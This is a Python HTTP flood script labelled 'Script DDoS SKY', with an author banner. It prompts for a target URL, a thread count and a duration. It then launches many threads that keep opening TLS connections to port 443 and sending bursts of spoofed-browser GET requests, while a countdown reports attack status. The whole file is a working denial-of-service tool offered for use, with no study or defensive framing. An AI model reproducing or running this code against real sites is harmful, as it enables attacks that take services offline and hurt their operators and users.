from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
from rich.panel import Panel as Panel
from rich.console import Console
console = Console()
#------------[ INDICATION ]---------------#
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE

def title():
    Console().print(Panel(f"""
%s███████████████████████
%s███████████████████████ %sGithub : %sRudal-XD
%s███████████████████████ %sWa     : %s+62895386194***
%s███████████████████████          
%s███████████████████████          
%s███████████████████████ 
%s"""%(M2,M2,K2,H2,M2,K2,H2,P2,P2,P2),subtitle=f'Script DDoS SKY',width=60))

def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')

            
def command():

    target = console.input(f" %s• %SURL :%s "%(H2,K2,H2))
    thread = console.input(f" %s• %STHREAD :%s "%(H2,K2,H2))
    t = console.input(f" %s• %STIME :%s "%(H2,K2,H2))
    threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
    timer = threading.Thread(target=countdown, args=(t,))
    timer.start()
    timer.join()

def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"•"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"•"+Fore.WHITE+" Attack Done !                                   \n")
            return

if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('ua.txt', 'r').read().split('\n')
        clear()
        title()
        while True:
            command()
    elif len(sys.argv) == 5:
        pass
